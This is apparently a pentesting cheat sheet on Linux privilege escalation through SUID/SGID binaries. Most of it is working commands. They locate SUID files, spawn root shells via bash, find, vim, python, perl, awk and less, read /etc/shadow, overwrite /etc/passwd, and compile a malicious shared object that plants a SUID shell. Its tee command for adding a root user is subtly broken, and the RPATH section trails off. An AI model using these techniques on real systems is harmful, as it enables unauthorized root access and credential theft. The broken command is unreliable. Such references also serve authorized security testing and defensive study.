title: Linux PrivEsc — SUID/SGID Abuse
html:
Linux PrivEsc — SUID/SGID Abuse

SUID/SGID binaries run with the file owner's privileges regardless of who executes them. A SUID root binary that can be abused gives instant root. Check GTFOBins for each binary found.

Find SUID Binaries

# All SUID files on system
find / -perm -4000 -type f 2>/dev/null

# SUID files sorted by path
find / -perm -4000 -type f 2>/dev/null | sort

# SUID files with owner info
find / -perm -4000 -type f 2>/dev/null -exec ls -la {} \;

# SUID owned by root specifically
find / -user root -perm -4000 -type f 2>/dev/null

Find SGID Binaries

# All SGID files
find / -perm -2000 -type f 2>/dev/null

# SGID files with group info
find / -perm -2000 -type f 2>/dev/null -exec ls -la {} \;

Find SUID + SGID Combined

# Any file with SUID or SGID bit set
find / -perm /6000 -type f 2>/dev/null

# With full listing
find / -perm /6000 -type f 2>/dev/null -exec ls -la {} \;

Common SUID Exploits

Reference: GTFOBins — check every binary found against this list.

bash

# If /bin/bash has SUID set
bash -p
# -p preserves the effective UID (SUID root = root shell)

find

find . -exec /bin/sh -p \; -quit

# Or execute a command as root
find . -exec whoami \;
find . -exec /bin/bash -p \; -quit

vim / vi

vim -c ':!/bin/sh -p'
vi -c ':!/bin/sh -p'

# From within vim
:set shell=/bin/sh
:shell

nano

# Open /etc/passwd or /etc/shadow directly
nano /etc/shadow
nano /etc/passwd

# Within nano: Ctrl+R, Ctrl+X to execute command
# Type: reset; sh 1>&0 2>&0

cp

# Copy /etc/shadow to readable location
cp /etc/shadow /tmp/shadow_copy
cat /tmp/shadow_copy

# Overwrite /etc/passwd with modified version
cp /tmp/passwd_modified /etc/passwd

env

env /bin/sh -p

nmap (old versions <5.21)

# Interactive mode (nmap < 5.21)
nmap --interactive
!sh

# Script mode
echo 'os.execute("/bin/sh")' > /tmp/nmap_shell.nse
nmap --script=/tmp/nmap_shell.nse

python / python3

python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'

perl

perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'

ruby

ruby -e 'Process::Sys.setuid(0); exec "/bin/sh"'

awk

awk 'BEGIN {system("/bin/sh -p")}'

less / more

# Open any file then drop to shell
less /etc/passwd
# Press v, then :!/bin/sh

# Or set SHELL env var first
SHELL=/bin/sh less /etc/passwd
# Then press !

tee

# Append to /etc/passwd a new root user
echo 'newroot:$(openssl passwd -1 password):0:0:root:/root:/bin/bash' | tee -a /etc/passwd

Shared Object Injection

If a SUID binary tries to load a missing shared library, create a malicious one in a writable directory on the library search path.

# Step 1: Find what the SUID binary loads
strace /path/to/suid_binary 2>&1 | grep -i "open\|access\|no such file"
ldd /path/to/suid_binary

# Step 2: Note missing .so file and its searched paths
strace /path/to/suid_binary 2>&1 | grep "ENOENT.*\.so"

# Step 3: Create malicious shared object
cat > /tmp/evil.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
    system("cp /bin/bash /tmp/bash; chmod +s /tmp/bash");
}
EOF
gcc -shared -fPIC -o /tmp/libmissing.so /tmp/evil.c

# Step 4: Place .so in a writable path the binary searches
cp /tmp/libmissing.so /path/writable/dir/libmissing.so

# Step 5: Execute binary
/path/to/suid_binary

# Step 6: Get root shell
/tmp/bash -p

RPATH Injection

# Check binary's RPATH
readelf -d /path/to/binary | grep -i rpath
objdump -x /path/to/binary | grep RPATH

# If RPATH includes a writable directory, drop .so there
excerpt: Find and exploit SUID/SGID binaries for privilege escalation — bash, find, vim, python, perl, ruby, shared object injection, and GTFOBins reference.
